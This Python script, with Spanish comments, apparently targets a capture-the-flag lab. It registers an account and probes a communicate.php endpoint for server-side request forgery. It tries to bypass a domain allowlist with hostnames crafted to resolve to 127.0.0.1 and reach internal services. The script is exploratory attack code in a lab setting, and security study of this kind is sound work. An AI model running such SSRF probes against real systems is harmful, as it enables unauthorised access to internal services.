#!/usr/bin/env python3
import requests
import random
import string

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

session = requests.Session()
username = random_string()
password = random_string()

# Register and login
data = {'name': 'testname', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}\n")

# Probar diferentes formas de enviar el request
print("[*] Test 1: SSRF básico con motherland.com")
data = {
    'url': 'http://motherland.com/',
    'data[test]': 'value'
}
resp = session.post(f"{TARGET}/communicate.php", data=data, timeout=5)
print(f"    Longitud de respuesta: {len(resp.text)}")
if "cURL Error" in resp.text:
    print(f"    Contiene: cURL Error")
if "response" in resp.text.lower():
    print(f"    Contiene: response")

# Intentar con URL que termine en motherland.com pero apunte a 127.0.0.1
print("\n[*] Test 2: Con subdominios personalizados")
test_domains = [
    "http://127-0-0-1.motherland.com/",
    "http://127001.motherland.com/",
    "http://local.motherland.com/",
]

for domain in test_domains:
    print(f"\n    Probando: {domain}")
    data = {'url': domain, 'data[test]': 'value'}
    try:
        resp = session.post(f"{TARGET}/communicate.php", data=data, timeout=5)
        if "cURL Error" in resp.text:
            import re
            match = re.search(r'cURL Error: ([^<]+)', resp.text)
            if match:
                error = match.group(1).strip()
                print(f"        Error: {error[:80]}")
        elif "response" in resp.text.lower() and len(resp.text) > 3000:
            print(f"        ¡Respuesta grande! ({len(resp.text)} bytes) - posible éxito")
    except Exception as e:
        print(f"        Exception: {str(e)[:80]}")

# Ver si puedo obtener información del response
print("\n[*] Test 3: Ver estructura exacta del response")
data = {
    'url': 'http://motherland.com/',
    'data[key1]': 'value1'
}
resp = session.post(f"{TARGET}/communicate.php", data=data, timeout=5)

# Buscar el div de response
import re
match = re.search(r'<pre>(.*?)</pre>', resp.text, re.DOTALL)
if match:
    content = match.group(1)
    print(f"    Contenido de <pre>: {len(content)} chars")
    if len(content) > 0:
        print(f"    Primeros 200 chars: {content[:200]}")

# Buscar error
match = re.search(r'<div class="error-message">(.*?)</div>', resp.text, re.DOTALL)
if match:
    error = match.group(1).strip()
    print(f"    Error message: {error}")

print("\n[*] ¿Hay alguna pista en los headers o cookies?")
print(f"    Response headers: {dict(resp.headers)}")
